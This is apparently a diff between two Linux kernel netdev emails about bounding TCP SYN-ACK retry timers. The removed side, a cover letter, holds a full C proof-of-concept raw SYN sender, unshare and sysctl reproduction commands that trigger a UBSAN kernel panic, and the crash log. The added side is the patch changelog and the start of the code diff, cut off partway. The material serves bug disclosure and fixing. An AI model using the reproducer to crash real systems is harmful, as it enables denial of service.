@@ -1,62 +1,64 @@
-Received: from mail-qv1-f45.google.com (mail-qv1-f45.google.com [209.85.219.45])
+Received: from mail-qt1-f170.google.com (mail-qt1-f170.google.com [209.85.160.170])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 28E7A35C6B4
-	for <netdev@vger.kernel.org>; Wed, 12 Aug 2026 13:39:14 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.219.45
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AE1F6364042
+	for <netdev@vger.kernel.org>; Wed, 12 Aug 2026 13:39:21 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.160.170
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1786541959; cv=none; b=n/EASd84heAKHD3kM/z0KnXqbjMsPWMNl16KSQGxjbXEdlHd0Dzr9x8fk2EEiA5YqXD2RcrslfYzfjSKURu96SPu7+xTHVXGTUAKRNSdWRPKU2WMqjQsgc4Tirx/QLdqiVGgPxhFkqXDTDVlQ5RxoBitHbzjdP7IP8sDKZSbc/0=
+	t=1786541963; cv=none; b=L1J116AhM3Mx1dvh23clQFVVKMOd5CY8AVz9RvAoSkuBf7ItJ14EQDs7T+YWpWG22H8/X5cDTyOfIAvyxwJAufgqArtmf1MJVsE9o6IlWaYOoa3QsOgKp0U9CsM4FTNkdJXN7mqAP3kfszdJlPK+Rtb9hN8c1rcKRSNtjjUEVjQ=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1786541959; c=relaxed/simple;
-	bh=HzkHPGWyWvJM3snFBWJiOgTI3kbaJ8nngug/aLreFg4=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=n/YvJvB1N3ae6LCE8i/hEuJl9lt9UeNjNw5RjVicpkaOCnBDrgMdSunuoT8QHWqJ1Rk3A4wq1zz9J76OcmXAgDy6bQYsl5JHzJnmBduD5y34RQsbkjlj4B9fT1jl3YY2vrvfscyOEUxhmI1OK0WWoyrbvIt/3cv4P2QIaText6w=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=gli0lFWV; arc=none smtp.client-ip=209.85.219.45
+	s=arc-20240116; t=1786541963; c=relaxed/simple;
+	bh=XDjJAS8AgcjW08ZuVEtzP6fjYRa8TGppc8r4LLbIgIs=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=HnNk/nNJ6xuUruEKHFmh7F/HeH37SF01YOvQOyLnIVPNyHD+TPBagbK3P1KIyPheccd2k6+HEzE2crLlopPQ9pmGlLAy7na5jqewGiZqCZPw3anzhzNH2Rq0u6ee20p2QM5sOavbmcPJOkS7p6PkgS5fvamViq0iaeaSooZUu9E=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=rJyfhFuE; arc=none smtp.client-ip=209.85.160.170
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="gli0lFWV"
-Received: by mail-qv1-f45.google.com with SMTP id 6a1803df08f44-8ef1dc934d1so8228406d6.0
-        for <netdev@vger.kernel.org>; Wed, 12 Aug 2026 06:39:14 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="rJyfhFuE"
+Received: by mail-qt1-f170.google.com with SMTP id d75a77b69052e-51c8e2e39easo10541401cf.0
+        for <netdev@vger.kernel.org>; Wed, 12 Aug 2026 06:39:21 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1786541953; x=1787146753; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=vr32YUMfV8lhYTDVvwVSB8/TJLO9Zxtj2fVqPnrO93Y=;
-        b=gli0lFWVI3BSe8sq/TKXi2gGuD9dWYnwNxSXFadVIt4htPozuGPzVo2KJmaGi0TOdc
-         mU0dPmyW6j6FqBw7NaHwPGhvgLvJxs4DC/K/uDzoMJeSKQo3o7zHNycofNRQ4vthkNxf
-         bxjmxrWwm8sSzREUlvJsOE/0fwA9NZxlSfMiAblfxG4g9vef7SawtKbKjN7QdvhCJ/IH
-         txEAAgse7HOepAVVnGwXEUvVfxHGEksCb+doNcI74Mg96w44SGni3tNDDKzPH9y3dXkM
-         GWHLAw/302GaqKtNKjwlE5ODEUzraQ+H9+bo8u+IHeUdcrEDykCkLc7Tlo1ZvRs/gjKm
-         v7ng==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1786541953; x=1787146753;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=nebusec.ai; s=google; t=1786541960; x=1787146760; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=vr32YUMfV8lhYTDVvwVSB8/TJLO9Zxtj2fVqPnrO93Y=;
-        b=Y+bwBMAkbbIDb9wwPZQO3b27TgjsMlEcXBy+fNBIV2Cr1IB7rgyZf8gSf2NpGsOFAM
-         KfoQ5nRAeDhLy/dLXz+fqYCQYbBiV4aRpHZuMkUOsYRdujee+EO3BktuVvjI7HPlZ8rJ
-         xdgdAUnreNYmWB91aFRmH8KSQZkEy3bJVM65/cEwBxZbjSp1AoxvfkWLaGUASREFprMR
-         Q/wn6PriJm50DtDR5g19dKqEy8liO9y4s501u6MQ9E2niZM91//phfpQBhEjxLpnt1zn
-         J2+g8da3FM3D61us5qfyz/xj+VH1FgjlTw+uITXntSeQsltWbfmlCsDuu0VOxDpF0jPX
-         kZcA==
-X-Gm-Message-State: AOJu0YyOWuxyOPdt+ruXG8iD8ygGp+f2zn0RJdzc8b9LT++Qfc5yWhWt
-	284mF6UxoJJN/CLKDZz3bu1DneIwuzGmmatm4NoxY9sreW2ixeal/jO+he1mu7YOolXUy/rTUxp
-	D8H/xVUQBDecMZg==
-X-Gm-Gg: AR+sD12GtIcoly4duykaccWcnxQLweyKCfwfC488fzkzOYmPnJ5JkB1XsEH5Ees7C0A
-	IGROP/UkbyEwx35aFXsffyK2s+Xr3eTH2L1QtF25caZ2Z5xtsw9jyQcYpWOgUT9RoBwlpGOqcTu
-	rV61hsbOthDUVQReMaWjG7vc7a6/2htp8J/DJEbuq9ng+OfRDHC006hdIzR5LqW6y60crB+vkd7
-	Sf/paSJZAewiUUDnXCYgmgQbtBrC9Y3Dj+RWdwmOH14i7oIZDnSXSWyOMkivTWV/f0Bbl2gVcDM
-	BuOvkroYd6qTkNiCc7DkEyiR0uWuqNn9yYUg3cppyOSIheYbORzBK9BXSunXxNfxC62uMawgncs
-	IjFGimJWxOpjWLH6MWhz+DQSIWTumUGJNpUPxeFZedsw1KOcFj0MvRwXJUDXjEuoEeVSIBcQ9nI
-	BkKWENxuZqKgJsxS08EV8OHvkutYw8TnY3ZEItYMa205jUCC+wvMN+t4PzdHfqyxX1U/ctDTtOD
-	gcfEQ==
-X-Received: by 2002:a05:6214:1c41:b0:907:86e6:f5a1 with SMTP id 6a1803df08f44-90a6baa8eeemr73362696d6.12.1786541952809;
-        Wed, 12 Aug 2026 06:39:12 -0700 (PDT)
+        bh=xpdMU/wEB50wNchXuEMT8+DVSA4jPR7scwO7A1aeM6o=;
+        b=rJyfhFuEze9ZdG8S8LaZKLIx5pzLrSvax5m0MzaHDiAn15jfOrr1ZCUB3dAMrq/dcB
+         prNZc0Xxf7p82nssOGupyeBNyT2Jw6UVj0IBjpXHttEJ+46nbH6Xpiy3jIjoEfgoKw++
+         mku8CejRot9ddZ9lgcg6L3wcOO5ix+fJX814CJM1cvc+UagUOtOUzeIFkeSUqlbKnIed
+         iKQbKfjdZPgEHz9MDnOtnzMHpFqfYmt6GfzcRqvxZiiusvDE4cTXYBRorHlMELjTa7wV
+         /KRbP/gOCty9ggidDYVHDNpS4HMnRkMkqhzBh7vpGke5xARYWCwdezcBlBHDiaGE5TNn
+         Og7Q==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1786541960; x=1787146760;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=xpdMU/wEB50wNchXuEMT8+DVSA4jPR7scwO7A1aeM6o=;
+        b=by6N0VCcyNy7BBJZKuhDDl9guCxXMS4r12dtPsKUkx8D65SZpu+HUh26N0MsIfVpbX
+         xrzLByS1fuewdc+wI0WG2IUlBuTWjKuqYYg3P1M+dg0xJSzP9BdXbKNoBA+y4BPcgvfQ
+         AgmYVx3E4tX0RbxNbcPPVNZbcjCUbQ0uGiydbCDCL1M0pzJGPI7y2KCUouCNN0fu/dj5
+         3DoCyL3444BAjEjaXEAJbIfu7pSNqk1E9nERe3IygZ6iFNqvYrsWHxJE0bX5j2h0oUjN
+         1xvwnXsSuRk6FOT49COGVzFskeBiN0PMpypKZmbnuwnPCP0KA/UgffuUBZgOJicIS7wU
+         K91w==
+X-Gm-Message-State: AOJu0YxIFnHUn4D9TwgfqMto/kCn9Nwvn8D5NXWmHlhr9q66T0zykq22
+	pcQ3OpqsshZOOz9PnWdLrkNmfYLttoEFnU1TA+Y9uxbIMC6HcG56FhnzNMmjYQrnG4pRE8IhFeP
+	yBys6Z1P9u2ZpNA==
+X-Gm-Gg: AR+sD10e2u7MA8B7BnKY8egyOED6Zq9omwx5w6PsGaxwY6oyEbUbGmsdqu2D9AdTVNO
+	kDFSxda2rohl54zRAlELuwz0jmDqLUhHtOJRvj3mV+c11Zaf0tTOlQOumB8RHexO16ZBVlW2cc4
+	+m2Ru0UKBbY6VBUxF2dhjpEe/OehjNo3BEVj3R9c0TlDMhC7H4yW+cGoFRwV0d8Qttr1GrDvL0f
+	Z3t73DvQp6pCq1FPDj2wKHzr4DAyCZcpEAWN0zYC2IfXSFt6zUGX+x6zTVKz10uZnNPUxdZgCbV
+	Pv4CWVPoZd/HCPu7jVpeVUj92eMRdilkpykRYdlhdPpd1PjZMJ/FNuvkOd5onKDFZxZ4wL/7u76
+	I5xKadER0Lx2gQfHdGgMADimGJsy0wF3Q3n92NQIOc1XeP4iPUDA6G/64vUDg6qJBA93+06nqZ7
+	/K/fbqtjS+3Pq79CdqCDfotX0A7ueNaTbeNgqbp3RV0XVtKlXwv0VyJlEEzK3L3Svi2JeL8oD15
+	azy
+X-Received: by 2002:a05:622a:4203:b0:517:a7ff:935f with SMTP id d75a77b69052e-52d646af7c4mr42649011cf.9.1786541960345;
+        Wed, 12 Aug 2026 06:39:20 -0700 (PDT)
 Received: from Roxy.localdomain ([203.175.14.54])
-        by smtp.gmail.com with ESMTPSA id 6a1803df08f44-90a6c3c0338sm21350226d6.40.2026.08.12.06.39.05
+        by smtp.gmail.com with ESMTPSA id 6a1803df08f44-90a6c3c0338sm21350226d6.40.2026.08.12.06.39.13
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Wed, 12 Aug 2026 06:39:11 -0700 (PDT)
+        Wed, 12 Aug 2026 06:39:19 -0700 (PDT)
 From: Zhiling Zou <zhilinz@nebusec.ai>
 To: netdev@vger.kernel.org,
 	linux-doc@vger.kernel.org
@@ -77,10 +79,12 @@ Cc: davem@davemloft.net,
 	yuuchihsu@gmail.com,
 	vega@nebusec.ai,
 	zhilinz@nebusec.ai
-Subject: [PATCH net v5 0/1] tcp: bound SYN-ACK timers to reqsk timeout range
-Date: Wed, 12 Aug 2026 21:38:52 +0800
-Message-ID: <cover.1786540242.git.zhilinz@nebusec.ai>
+Subject: [PATCH net v5 1/1] tcp: bound SYN-ACK timers to reqsk timeout range
+Date: Wed, 12 Aug 2026 21:38:53 +0800
+Message-ID: <9ec8921d81d6218946e07e8542b1ac41b6e2d205.1786540242.git.zhilinz@nebusec.ai>
 X-Mailer: git-send-email 2.43.0
+In-Reply-To: <cover.1786540242.git.zhilinz@nebusec.ai>
+References: <cover.1786540242.git.zhilinz@nebusec.ai>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -89,317 +93,59 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Hi Linux kernel maintainers,
+request_sock::num_timeout is a 7-bit counter. Commit e6c022a4fa2d
+("tcp: better retrans tracking for defer-accept") split this counter
+out of an 8-bit field, but tcp_synack_retries still accepts an 8-bit
+value and TCP_DEFER_ACCEPT can still derive a retry count up to 255.
 
-We found and validated an issue in net/ipv4/inet_connection_sock.c.
-The bug is reachable by a non-root user via user and net namespace.
+If these settings exceed 127, the regular request timer cannot reach
+its expiration threshold and num_timeout wraps to zero. After the wrap,
+the request can keep timing out instead of expiring, and the next
+zero-to-one transition repeats the young-queue accounting decrement.
 
-We've tested it, and it should not affect normal TCP request socket
-timeout handling.
+Both request timer paths can also shift req->timeout by 64 or more while
+calculating the next RTO. UBSAN reports that invalid shift, and systems
+with panic_on_warn=1 panic before the later cap can take effect.
 
-The issue is caused by allowing SYN-ACK timer limits above the range
-that request socket timeout backoff can safely consume.
+Limit tcp_synack_retries and the TCP_DEFER_ACCEPT conversion to the
+range represented by num_timeout, preserving the same defer-accept value
+for its timer and bare-ACK consumers. Saturate RTO calculation before
+the shift, and cap the Fast Open extra retry to the same range.
 
----- details below ----
+Fixes: e6c022a4fa2d ("tcp: better retrans tracking for defer-accept")
+Cc: stable@vger.kernel.org
+Reported-by: Vega <vega@nebusec.ai>
+Signed-off-by: Zhiling Zou <zhilinz@nebusec.ai>
+---
+changes in v5:
+- Limit tcp_synack_retries and TCP_DEFER_ACCEPT at their configuration
+  paths, so all users of each value see the same 7-bit range.
+- Use 127, matching request_sock::num_timeout, instead of the previous
+  runtime limit of 63, and document the sysctl limit.
+- Spell out the 7-bit range mismatch, the repeated young-queue accounting,
+  and the UBSAN panic_on_warn failure mode in the commit message.
+- Keep the timeout calculation saturating before either SYN-ACK timer
+  shifts it.
+- Drop a no-op reqsk_timer_handler() formatting hunk.
+- Correct the Fixes tag and update the reporter and sign-off trailers.
+- v4 Link: https://lore.kernel.org/all/891a220c362e3266efdf6b1aa9dc3e52f6825c00.1784735392.git.zhilinz@nebusec.ai/
 
-Bug details:
+Changes in v4:
+  - Drop the tcp_synack_retries sysctl maximum to preserve existing
+    user-space behavior, and keep the runtime clamps at the timer usage
+    sites.
+  - v3 Link: https://lore.kernel.org/all/20260702095324.2995243-1-n05ec@lzu.edu.cn/
 
-request_sock::num_timeout is a 7-bit counter. tcp_synack_retries accepts
-an 8-bit value, while TCP_DEFER_ACCEPT converts seconds to a retry count
-that can also reach 255.
+Changes in v3:
+  - Order local variables in tcp_reqsk_timeout_sk() by reverse Christmas
+    tree.
+  - v2 Link: https://lore.kernel.org/all/20260630035009.55201-1-n05ec@lzu.edu.cn/
 
-When either value exceeds 127, the request socket timer can never reach
-its expiration threshold. num_timeout then wraps from 127 to zero, which
-also repeats the young-queue accounting transition. Before the wrap, the
-regular and Fast Open SYN-ACK timer paths can shift req->timeout by 64 or
-more when calculating the next RTO.
-
-The fix rejects tcp_synack_retries values above the counter range and
-caps the TCP_DEFER_ACCEPT conversion at the same limit. This keeps the
-timer and bare-ACK consumers of rskq_defer_accept consistent. The common
-timeout calculation now saturates before shifting, and the Fast Open
-extra retry is capped to the representable range.
-
-
-Reproducer:
-
-    gcc -O2 -Wall -o poc poc.c
-    unshare -Urn sh -c '\''
-        ip link set lo up
-        echo 1 > /proc/sys/kernel/panic_on_warn
-        echo 0 > /proc/sys/net/ipv4/tcp_syncookies
-        echo 128 > /proc/sys/net/ipv4/tcp_synack_retries
-        echo 1000 > /proc/sys/net/ipv4/tcp_rto_max_ms
-        ./poc 127.0.0.2 40000 127.0.0.1 12345
-    '\''
-
-We ran the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-
-------BEGIN poc.c------
-
-#include <arpa/inet.h>
-#include <errno.h>
-#include <netinet/ip.h>
-#include <netinet/tcp.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <unistd.h>
-
-struct pseudo_header {
-	uint32_t src_addr;
-	uint32_t dst_addr;
-	uint8_t zero;
-	uint8_t protocol;
-	uint16_t tcp_len;
-};
-
-static uint16_t checksum(const void *data, size_t len)
-{
-	const uint16_t *words = data;
-	uint32_t sum = 0;
-
-	while (len > 1) {
-		sum += *words++;
-		len -= 2;
-	}
-
-	if (len)
-		sum += *(const uint8_t *)words;
-
-	while (sum >> 16)
-		sum = (sum & 0xffff) + (sum >> 16);
-
-	return (uint16_t)~sum;
-}
-
-int main(int argc, char **argv)
-{
-	struct sockaddr_in dst = { 0 };
-	struct pseudo_header psh = { 0 };
-	struct {
-		struct iphdr ip;
-		struct tcphdr tcp;
-	} packet = { 0 };
-	unsigned char pseudo_buf[sizeof(psh) + sizeof(packet.tcp)];
-	const char *src_ip;
-	const char *dst_ip;
-	int sock;
-	int one = 1;
-	long src_port;
-	long dst_port;
-	ssize_t sent;
-
-	if (argc != 5) {
-		fprintf(stderr, "usage: %s <src_ip> <src_port> <dst_ip> <dst_port>\n", argv[0]);
-		return 2;
-	}
-
-	src_ip = argv[1];
-	src_port = strtol(argv[2], NULL, 10);
-	dst_ip = argv[3];
-	dst_port = strtol(argv[4], NULL, 10);
-	if (src_port <= 0 || src_port > 65535 || dst_port <= 0 || dst_port > 65535) {
-		fprintf(stderr, "invalid port\n");
-		return 2;
-	}
-
-	sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-	if (sock < 0) {
-		perror("socket");
-		return 1;
-	}
-
-	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-		perror("setsockopt(IP_HDRINCL)");
-		close(sock);
-		return 1;
-	}
-
-	dst.sin_family = AF_INET;
-	dst.sin_port = htons((uint16_t)dst_port);
-	if (inet_pton(AF_INET, dst_ip, &dst.sin_addr) != 1) {
-		fprintf(stderr, "invalid dst_ip: %s\n", dst_ip);
-		close(sock);
-		return 2;
-	}
-
-	packet.ip.version = 4;
-	packet.ip.ihl = sizeof(packet.ip) / 4;
-	packet.ip.tos = 0;
-	packet.ip.tot_len = htons(sizeof(packet));
-	packet.ip.id = htons((uint16_t)getpid());
-	packet.ip.frag_off = 0;
-	packet.ip.ttl = 64;
-	packet.ip.protocol = IPPROTO_TCP;
-	if (inet_pton(AF_INET, src_ip, &packet.ip.saddr) != 1) {
-		fprintf(stderr, "invalid src_ip: %s\n", src_ip);
-		close(sock);
-		return 2;
-	}
-	packet.ip.daddr = dst.sin_addr.s_addr;
-	packet.ip.check = checksum(&packet.ip, sizeof(packet.ip));
-
-	packet.tcp.source = htons((uint16_t)src_port);
-	packet.tcp.dest = htons((uint16_t)dst_port);
-	packet.tcp.seq = htonl(0x12345678);
-	packet.tcp.doff = sizeof(packet.tcp) / 4;
-	packet.tcp.syn = 1;
-	packet.tcp.window = htons(65535);
-
-	psh.src_addr = packet.ip.saddr;
-	psh.dst_addr = packet.ip.daddr;
-	psh.zero = 0;
-	psh.protocol = IPPROTO_TCP;
-	psh.tcp_len = htons(sizeof(packet.tcp));
-	memcpy(pseudo_buf, &psh, sizeof(psh));
-	memcpy(pseudo_buf + sizeof(psh), &packet.tcp, sizeof(packet.tcp));
-	packet.tcp.check = checksum(pseudo_buf, sizeof(pseudo_buf));
-
-	sent = sendto(sock, &packet, sizeof(packet), 0,
-		      (struct sockaddr *)&dst, sizeof(dst));
-	if (sent != (ssize_t)sizeof(packet)) {
-		if (sent < 0)
-			perror("sendto");
-		else
-			fprintf(stderr, "short send: %zd\n", sent);
-		close(sock);
-		return 1;
-	}
-
-	close(sock);
-	return 0;
-}
-
-------END poc.c--------
-
-----BEGIN crash log----
-
-[  463.180218][    C3] Kernel panic - not syncing: UBSAN: panic_on_warn set ...
-[  463.181502][    C3] CPU: 3 UID: 0 PID: 0 Comm: swapper/3 Not tainted 7.1.0-rc1 #2 PREEMPT(full)
-[  463.182748][    C3] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[  463.184251][    C3] Call Trace:
-[  463.184723][    C3]  <IRQ>
-[  463.185125][    C3]  vpanic+0x6c3/0x790
-[  463.185795][    C3]  ? __pfx_vpanic+0x10/0x10
-[  463.186461][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  463.187264][    C3]  ? __show_trace_log_lvl+0x2f1/0x420
-[  463.188052][    C3]  panic+0xca/0xd0
-[  463.188605][    C3]  ? __pfx_panic+0x10/0x10
-[  463.189281][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  463.190089][    C3]  check_panic_on_warn+0x61/0x80
-[  463.190816][    C3]  __ubsan_handle_shift_out_of_bounds+0x1dd/0x2d0
-[  463.191774][    C3]  reqsk_timer_handler.cold+0x18/0x26
-[  463.192570][    C3]  ? __pfx_reqsk_timer_handler+0x10/0x10
-[  463.193389][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  463.194218][    C3]  ? __pfx_reqsk_timer_handler+0x10/0x10
-[  463.195181][    C3]  call_timer_fn+0x16b/0x500
-[  463.196028][    C3]  ? debug_object_deactivate+0x2e4/0x3b0
-[  463.197045][    C3]  ? trace_softirq_raise+0x11a/0x160
-[  463.197852][    C3]  ? __pfx_call_timer_fn+0x10/0x10
-[  463.198593][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  463.199411][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  463.200213][    C3]  ? rcu_is_watching+0x12/0xc0
-[  463.200904][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  463.201763][    C3]  __run_timers+0x5d9/0x9c0
-[  463.202468][    C3]  ? __pfx_reqsk_timer_handler+0x10/0x10
-[  463.203308][    C3]  ? __pfx___run_timers+0x10/0x10
-[  463.204049][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  463.204871][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  463.205704][    C3]  run_timer_base+0xfe/0x170
-[  463.206370][    C3]  ? __pfx_run_timer_base+0x10/0x10
-[  463.207115][    C3]  ? rcu_is_watching+0x12/0xc0
-[  463.207809][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  463.208619][    C3]  run_timer_softirq+0x10/0x30
-[  463.209311][    C3]  handle_softirqs+0x1ef/0xa00
-[  463.210022][    C3]  ? __pfx_handle_softirqs+0x10/0x10
-[  463.210788][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  463.211590][    C3]  __irq_exit_rcu+0x169/0x210
-[  463.212281][    C3]  irq_exit_rcu+0xe/0x30
-[  463.212885][    C3]  sysvec_apic_timer_interrupt+0xa3/0xc0
-[  463.213688][    C3]  </IRQ>
-[  463.214105][    C3]  <TASK>
-[  463.214538][    C3]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
-[  463.215398][    C3] RIP: pv_native_safe_halt+0xf/0x20
-[  463.216189][    C3] Code: 77 5b 02 e9 de d9 80 f6 0f 1f 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa eb 07 0f 00 2d d3 32 1a 00 fb f4 <e9> b7 d9 80 f6 66 2e 0f 1f 84 00 00 00 00 00 66 90 90 90 90 90 90
-All code
-========
-   0:	77 5b                	ja     0x5d
-   2:	02 e9                	add    %cl,%ch
-   4:	de d9                	fcompp
-   6:	80 f6 0f             	xor    $0xf,%dh
-   9:	1f                   	(bad)
-   a:	00 90 90 90 90 90    	add    %dl,-0x6f6f6f70(%rax)
-  10:	90                   	nop
-  11:	90                   	nop
-  12:	90                   	nop
-  13:	90                   	nop
-  14:	90                   	nop
-  15:	90                   	nop
-  16:	90                   	nop
-  17:	90                   	nop
-  18:	90                   	nop
-  19:	90                   	nop
-  1a:	90                   	nop
-  1b:	f3 0f 1e fa          	endbr64
-  1f:	eb 07                	jmp    0x28
-  21:	0f 00 2d d3 32 1a 00 	verw   0x1a32d3(%rip)        # 0x1a32fb
-  28:	fb                   	sti
-  29:	f4                   	hlt
-  2a:*	e9 b7 d9 80 f6       	jmp    0xfffffffff680d9e6		<-- trapping instruction
-  2f:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
-  36:	00 00 00 
-  39:	66 90                	xchg   %ax,%ax
-  3b:	90                   	nop
-  3c:	90                   	nop
-  3d:	90                   	nop
-  3e:	90                   	nop
-  3f:	90                   	nop
-
-Code starting with the faulting instruction
-===========================================
-   0:	e9 b7 d9 80 f6       	jmp    0xfffffffff680d9bc
-   5:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
-   c:	00 00 00 
-   f:	66 90                	xchg   %ax,%ax
-  11:	90                   	nop
-  12:	90                   	nop
-  13:	90                   	nop
-  14:	90                   	nop
-  15:	90                   	nop
-[  463.218880][    C3] RSP: 0018:ffa000000017fdf0 EFLAGS: 00000202
-[  463.219748][    C3] RAX: 00000000001a917f RBX: ff110001036c25c0 RCX: ffffffff8a8f7fa5
-[  463.220859][    C3] RDX: 0000000000000000 RSI: ffffffff8cc14de4 RDI: ffffffff8b0f3640
-[  463.221969][    C3] RBP: 0000000000000000 R08: 0000000000000001 R09: ffe21c0022fb67ed
-[  463.223076][    C3] R10: ff11000117db3f6b R11: 0000000000000072 R12: 0000000000000003
-[  463.224187][    C3] R13: ffe21c00206d84b8 R14: 0000000000000003 R15: ffffffff90914550
-[  463.225338][    C3]  ? ct_kernel_exit+0x125/0x180
-[  463.226067][    C3]  default_idle+0x9/0x10
-[  463.226686][    C3]  default_idle_call+0x6c/0xb0
-[  463.227379][    C3]  do_idle+0x469/0x590
-[  463.227983][    C3]  ? __pfx_do_idle+0x10/0x10
-[  463.228645][    C3]  ? finish_task_switch.isra.0+0x151/0x1050
-[  463.229524][    C3]  cpu_startup_entry+0x54/0x60
-[  463.230222][    C3]  start_secondary+0x213/0x2b0
-[  463.230905][    C3]  ? __pfx_start_secondary+0x10/0x10
-[  463.231687][    C3]  common_startup_64+0x13e/0x148
-[  463.232457][    C3]  </TASK>
-[  463.233555][    C3] Kernel Offset: disabled
-[  463.234244][    C3] Rebooting in 86400 seconds..
-
------END crash log-----
-
-Best regards,
-Zhiling Zou
-
-
-
-
-Zhiling Zou (1):
-  tcp: bound SYN-ACK timers to reqsk timeout range
+Changes in v2:
+  - Keep the existing max_retries calculation in
+    tcp_fastopen_synack_timer() and only add the clamp, avoiding code
+    churn.
+  - v1 Link: https://lore.kernel.org/all/02e24eb83639e9d7ecc623f000c60254bb5c40a5.1782643946.git.roxy520tt@gmail.com/
 
  Documentation/networking/ip-sysctl.rst |  2 +-
  include/net/tcp.h                      | 20 ++++++++++++++++----
@@ -408,6 +154,120 @@ Zhiling Zou (1):
  net/ipv4/tcp_timer.c                   |  6 ++++--
  5 files changed, 24 insertions(+), 8 deletions(-)
 
+diff --git a/Documentation/networking/ip-sysctl.rst b/Documentation/networking/ip-sysctl.rst
+index 208f46967ee59..fd5038b6cab9f 100644
+--- a/Documentation/networking/ip-sysctl.rst
++++ b/Documentation/networking/ip-sysctl.rst
+@@ -954,7 +954,7 @@ tcp_stdurg - BOOLEAN
+ 
+ tcp_synack_retries - INTEGER
+ 	Number of times SYNACKs for a passive TCP connection attempt will
+-	be retransmitted. Should not be higher than 255. Default value
++	be retransmitted. Should not be higher than 127. Default value
+ 	is 5, which corresponds to 31seconds till the last retransmission
+ 	with the current initial RTO of 1second. With this the final timeout
+ 	for a passive TCP connection will happen after 63seconds.
+diff --git a/include/net/tcp.h b/include/net/tcp.h
+index 2c5b889530b55..8ab2fd368ed3b 100644
+--- a/include/net/tcp.h
++++ b/include/net/tcp.h
+@@ -183,6 +183,8 @@ static_assert((1 << ATO_BITS) > TCP_DELACK_MAX);
+ #define MAX_TCP_KEEPINTVL	32767
+ #define MAX_TCP_KEEPCNT		127
+ #define MAX_TCP_SYNCNT		127
++/* request_sock::num_timeout is a 7-bit field. */
++#define MAX_TCP_SYNACK_RETRIES	127
+ 
+ /* Ensure that TCP PAWS checks are relaxed after ~2147 seconds
+  * to avoid overflows. This assumes a clock smaller than 1 Mhz.
+@@ -882,12 +884,22 @@ static inline u32 __tcp_set_rto(const struct tcp_sock *tp)
+ 	return usecs_to_jiffies((tp->srtt_us >> 3) + tp->rttvar_us);
+ }
+ 
+-static inline unsigned long tcp_reqsk_timeout(struct request_sock *req)
